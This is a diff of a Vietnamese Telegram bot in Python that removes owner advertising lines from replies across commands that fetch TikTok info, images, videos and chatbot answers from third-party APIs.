+        sent_message = bot.reply_to(message, 'Vui lòng nhập đúng lệnh /tiktokid <id Tài Khoản Tiktok>\nVí Dụ:/tiktokid @kecodon7103>>')
+
         return
-    
+
     user_id = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
     if not user_id:
-        bot.reply_to(message, "Vui lòng cung cấp ID người dùng TikTok.\nSử dụng: /tiktokid <id Tài Khoản Tiktok\nVí Dụ:/tiktokid:@kecodon7103>\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+        bot.reply_to(message, "Vui lòng cung cấp ID người dùng TikTok.\nSử dụng: /tiktokid <id Tài Khoản Tiktok\nVí Dụ:/tiktokid:@kecodon7103>")
+
         return
 
     api_url = "https://api.sumiproject.net/tiktok?info="
@@ -2053,15 +1576,6 @@ def handle_tiktok(message):
     else:
         bot.reply_to(message, stats_or_error)
 
-
-
-
-
-
-
-
-
-
 @bot.message_handler(commands=['anhgai'])
 def anhh_gai(message):
     user_id = message.from_user.id
@@ -2070,7 +1584,7 @@ def anhh_gai(message):
     if not is_bot_active:
         bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
-    
+
     # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type not in ["group", "supergroup"]:
         bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
@@ -2083,7 +1597,7 @@ def anhh_gai(message):
 
     try:
         response = requests.get('https://api.sumiproject.net/images/girl')
-        
+
         if response.status_code == 200:
             data = response.json()
             if 'url' in data:
@@ -2094,21 +1608,16 @@ def anhh_gai(message):
                     user_mention = f"<a href='tg://user?id={user_id}'></a>"
 
                 bot.send_message(message.chat.id, f"@{username} đã yêu cầu ảnh:", parse_mode='HTML')
-                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n• VPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n• Shop 4G 💳💲: https://4gvpsvanmanhgaming.click\n• Ảnh dành cho @{username}", parse_mode='HTML')
+                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• Ảnh dành cho @{username}", parse_mode='HTML')
             else:
                 bot.reply_to(message, "❌ Không tìm thấy URL ảnh trong phản hồi từ API.")
         else:
-            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n Shop 4G 💳💲: 'https://4gvpsvanmanhgaming.click")
+            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}")
+
     except requests.exceptions.RequestException as req_err:
-        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: 'https://httpsvpsvanmanhgaming.click\n Shop 4G 💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n\n ")
     except Exception as e:
-        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.clic\n Shop 4G 💳💲: https://4gvpsvanmanhgaming.click")
-
-
-
-
-
-
+        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n")
 
 @bot.message_handler(commands=['anhgaisexy'])
 def anhh_gai(message):
@@ -2118,7 +1627,7 @@ def anhh_gai(message):
     if not is_bot_active:
         bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
-    
+
     # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type not in ["group", "supergroup"]:
         bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
@@ -2131,7 +1640,7 @@ def anhh_gai(message):
 
     try:
         response = requests.get('https://api.sumiproject.net/video/girlsexy')
-        
+
         if response.status_code == 200:
             data = response.json()
             if 'url' in data:
@@ -2142,21 +1651,15 @@ def anhh_gai(message):
                     user_mention = f"<a href='tg://user?id={user_id}'></a>"
 
                 bot.send_message(message.chat.id, f"@{username} đã yêu cầu ảnh:", parse_mode='HTML')
-                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n•Shop 4G 💳💲: https://4gvpsvanmanhgaming.click\n• Ảnh dành cho @{username}", parse_mode='HTML')
+                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• Ảnh dành cho @{username}", parse_mode='HTML')
             else:
                 bot.reply_to(message, "❌ Không tìm thấy URL ảnh trong phản hồi từ API.")
         else:
-            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: 'https://4gvpsvanmanhgaming.click")
+            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n\n")
     except requests.exceptions.RequestException as req_err:
-        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: 'https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n\n")
     except Exception as e:
-        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.clic\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")
-
-
-
-
-
-
+        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n")
 
 @bot.message_handler(commands=['anhgaianime'])
 def anhh_gai(message):
@@ -2166,7 +1669,7 @@ def anhh_gai(message):
     if not is_bot_active:
         bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
-    
+
     # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type not in ["group", "supergroup"]:
         bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
@@ -2179,7 +1682,7 @@ def anhh_gai(message):
 
     try:
         response = requests.get('https://api.sumiproject.net/images/anime')
-        
+
         if response.status_code == 200:
             data = response.json()
             if 'url' in data:
@@ -2190,18 +1693,15 @@ def anhh_gai(message):
                     user_mention = f"<a href='tg://user?id={user_id}'></a>"
 
                 bot.send_message(message.chat.id, f"@{username} đã yêu cầu ảnh:", parse_mode='HTML')
-                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n•Shop 4G 💳💲: https://4gvpsvanmanhgaming.click\n• Ảnh dành cho @{username}", parse_mode='HTML')
+                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• Ảnh dành cho @{username}", parse_mode='HTML')
             else:
                 bot.reply_to(message, "❌ Không tìm thấy URL ảnh trong phản hồi từ API.")
         else:
-            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: 'https://4gvpsvanmanhgaming.click")
+            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n\n")
     except requests.exceptions.RequestException as req_err:
-        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: 'https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n\n")
     except Exception as e:
-        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.clic\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")
-
-
-
+        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n")
 
 @bot.message_handler(commands=['vdgai'])
 def vdgai(message):
@@ -2210,7 +1710,7 @@ def vdgai(message):
     if not is_bot_active:
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2223,7 +1723,7 @@ def vdgai(message):
 
     try:
         response = requests.get('https://api.sumiproject.net/video/videogai')
-        
+
         if response.status_code == 200:
             data = response.json()
             if 'url' in data:
@@ -2235,20 +1735,17 @@ def vdgai(message):
                 else:
                     user_mention = f"<a href='tg://user?id={user_id}'>người dùng</a>"
 
-                bot.send_message(message.chat.id, f"{user_mention} đã yêu cầu video:\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
-                bot.send_video(message.chat.id, video_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n•Video dành cho {user_mention}")
+                bot.send_message(message.chat.id, f"{user_mention} đã yêu cầu video:")
+
+                bot.send_video(message.chat.id, video_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n•Video dành cho {user_mention}")
             else:
                 bot.reply_to(message, "Không tìm thấy URL video trong phản hồi từ API")
         else:
             bot.reply_to(message, f"Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}")
     except requests.exceptions.RequestException as req_err:
-        bot.reply_to(message, f"Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
+        bot.reply_to(message, f"Lỗi khi gửi yêu cầu: {req_err}\n ")
     except Exception as e:
-        bot.reply_to(message, f"Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
-
-
-
-
+        bot.reply_to(message, f"Đã xảy ra lỗi: {e}\n")
 
 @bot.message_handler(commands=['vdgaianime'])
 def vdgai(message):
@@ -2257,7 +1754,7 @@ def vdgai(message):
     if not is_bot_active:
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2270,7 +1767,7 @@ def vdgai(message):
 
     try:
         response = requests.get('https://api.sumiproject.net/video/videoanime')
-        
+
         if response.status_code == 200:
             data = response.json()
             if 'url' in data:
@@ -2280,21 +1777,21 @@ def vdgai(message):
                 if username:
                     user_mention = f"@{username}"
                 else:
-                    user_mention = f"<a href='tg://user?id={user_id}'>người dùng</a>\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n"
+                    user_mention = f"<a href='tg://user?id={user_id}'>người dùng</a>"
 
-                bot.send_message(message.chat.id, f"{user_mention} đã yêu cầu video:\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
-                bot.send_video(message.chat.id, video_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n•Video dành cho {user_mention}")
+                bot.send_message(message.chat.id, f"{user_mention} đã yêu cầu video:\n")
+                bot.send_video(message.chat.id, video_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n•Video dành cho {user_mention}")
             else:
-                bot.reply_to(message, "Không tìm thấy URL video trong phản hồi từ API\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+                bot.reply_to(message, "Không tìm thấy URL video trong phản hồi từ API")
+
         else:
-            bot.reply_to(message, f"Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+            bot.reply_to(message, f"Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}")
+
     except requests.exceptions.RequestException as req_err:
-        bot.reply_to(message, f"Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        bot.reply_to(message, f"Lỗi khi gửi yêu cầu: {req_err}")
+
     except Exception as e:
-        bot.reply_to(message, f"Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
-
-
-
+        bot.reply_to(message, f"Đã xảy ra lỗi: {e}")
 
 @bot.message_handler(commands=['ask'])
 def gpt4_query(message):
@@ -2333,25 +1830,29 @@ def gpt4_query(message):
         # Kiểm tra xem phản hồi có dữ liệu hợp lệ không
         if 'data' in response_data:
             data = response_data['data']
-            bot.reply_to(message, f'🤖 Phản hồi của GPT-4:\n{data}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+            bot.reply_to(message, f'🤖 Phản hồi của GPT-4:\n{data}')
+
         else:
-            bot.reply_to(message, 'Không có dữ liệu phản hồi từ API.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+            bot.reply_to(message, 'Không có dữ liệu phản hồi từ API.')
+
         # Lưu dữ liệu thô vào log
-        logging.info(f"Response data for query '{query}': {response_data}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
+        logging.info(f"Response data for query '{query}': {response_data}")
 
     except requests.HTTPError as http_err:
-        logging.error(f'HTTP error occurred: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
-        bot.reply_to(message, f'Có lỗi HTTP khi gọi API: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        logging.error(f'HTTP error occurred: {http_err}')
+
+        bot.reply_to(message, f'Có lỗi HTTP khi gọi API: {http_err}')
+
     except requests.RequestException as req_err:
         logging.error(f'Request error occurred: {req_err}')
-        bot.reply_to(message, f'Có lỗi khi yêu cầu API: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        bot.reply_to(message, f'Có lỗi khi yêu cầu API: {req_err}')
+
     except Exception as err:
         logging.error(f'Unexpected error occurred: {err}')
-        bot.reply_to(message, f'Có lỗi không xác định: {err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        bot.reply_to(message, f'Có lỗi không xác định: {err}')
 
 # Xóa webhook trước khi bắt đầu polling
 bot.delete_webhook()
-
 
 @bot.message_handler(commands=['gemini'])
 def ask(message):
@@ -2379,27 +1880,27 @@ def ask(message):
     user_id = user.id
     username = user.username if user.username else "Không có username"
     full_name = user.full_name if user.full_name else "No Name"
-    
+
     # Ghi lại thời gian khi nhận lệnh
     start_time = time.time()
     start_time_formatted = datetime.datetime.fromtimestamp(start_time).strftime('%H:%M:%S')
-    
+
     user_input = message.text.replace('/gemini', '').strip()
     if not user_input:
         bot.reply_to(message, 'Vui lòng nhập một văn bản sau lệnh /gemini.')
         return
-    
+
     api_url = f'http://hlam-api.x10.mx/gemini.php?text={user_input}'
     try:
         response = requests.get(api_url)
         response.raise_for_status()  # Kiểm tra mã trạng thái HTTP
-        
+
         try:
             result = response.json()  # Giải mã phản hồi JSON
             message_text = result.get('text', 'Connect @pautous Và @Vpsvanmanhgaming')
         except ValueError:
             message_text = 'Lỗi xử lý phản hồi API: Không thể giải mã JSON.'
-        
+
         # Tính thời gian trôi qua
         elapsed_time = time.time() - start_time
         elapsed_minutes = int(elapsed_time // 60)
@@ -2411,16 +1912,12 @@ def ask(message):
 🟢<b><i>Time</i></b> : {start_time_formatted}
 ⏱<b><i>Response Time</i></b> : {elapsed_time_str}
 👤<b><i>User By:</i></b> : {user_link}
-<b><i>VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click</i></b>
-<b><i>Shop 4G💳💲:https://4gvpsvanmanhgaming.click</i></b>
 ✧══════ ༺༻ •══════✧
 '''
         bot.send_message(chat_id=chat_id, text=hi, parse_mode="html")
-    
+
     except requests.RequestException as e:
         bot.send_message(chat_id=chat_id, text=f'Có lỗi xảy ra khi gọi API: {str(e)}')
-
-
 
 @bot.message_handler(commands=['crush'])
 def check_freefire_account(message):
@@ -2430,7 +1927,7 @@ def check_freefire_account(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2440,7 +1937,6 @@ def check_freefire_account(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-
 
     # URL của API
     api_url = 'https://api.sumiproject.net/text/thinh'
@@ -2456,22 +1952,19 @@ def check_freefire_account(message):
         # Kiểm tra xem phản hồi có 'data' không
         if 'data' in response_data:
             data = response_data['data']
-            bot.reply_to(message, f'🌸 {data}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+            bot.reply_to(message, f'🌸 {data}')
+
         else:
-            bot.reply_to(message, 'Không có dữ liệu phản hồi từ API.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+            bot.reply_to(message, 'Không có dữ liệu phản hồi từ API.')
 
     except requests.HTTPError as http_err:
-        bot.reply_to(message, f'Có lỗi HTTP khi gọi API: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        bot.reply_to(message, f'Có lỗi HTTP khi gọi API: {http_err}')
 
     except requests.RequestException as req_err:
-        bot.reply_to(message, f'Có lỗi khi yêu cầu API: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        bot.reply_to(message, f'Có lỗi khi yêu cầu API: {req_err}')
 
     except Exception as err:
-        bot.reply_to(message, f'Có lỗi không xác định: {err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
-
-
-
-
+        bot.reply_to(message, f'Có lỗi không xác định: {err}')
 
 @bot.message_handler(commands=['cpu'])
 def check_cpu(message):
@@ -2481,7 +1974,7 @@ def check_cpu(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -2491,11 +1984,12 @@ def check_cpu(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     user_id = message.from_user.id
     if user_id not in ADMIN_ID:
-        if user_id not in ADMIN_AD:   
-            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này. \n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
+        if user_id not in ADMIN_AD:
+            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này. ')
+
             return
 
     # Tiếp tục xử lý lệnh cpu ở đây
@@ -2504,9 +1998,6 @@ def check_cpu(message):
 
     bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%\n'
 '━━━━━━━━━━━━━━━━━━━\nhttps://files.catbox.moe/92yrkf.mp4\n━━━━━━━━━━━━━━━━━━━')
-
-
-
 
 ADMIN_UID = {6244038301}  # Sử dụng set để chứa user_id của admin
 
@@ -2523,15 +2014,13 @@ def turn_off(message):
     is_bot_active = False
     bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác!')
 
-
-
 @bot.message_handler(commands=['khoidonglai'])
 def handle_start(message):
     user_id = message.from_user.id
     if user_id not in ADMIN_UID:
         bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!')
         return
-    
+
     if not is_bot_active:
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
@@ -2546,9 +2035,6 @@ def handle_start(message):
 
     bot.send_message(message.chat.id, "Bot đã được khởi động lại!")
 
-
-
-
 @bot.message_handler(commands=['on'])
 def turn_on(message):
     user_id = message.from_user.id
@@ -2558,12 +2044,7 @@ def turn_on(message):
 
     global is_bot_active
     is_bot_active = True
-    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
-
-
-
-
-
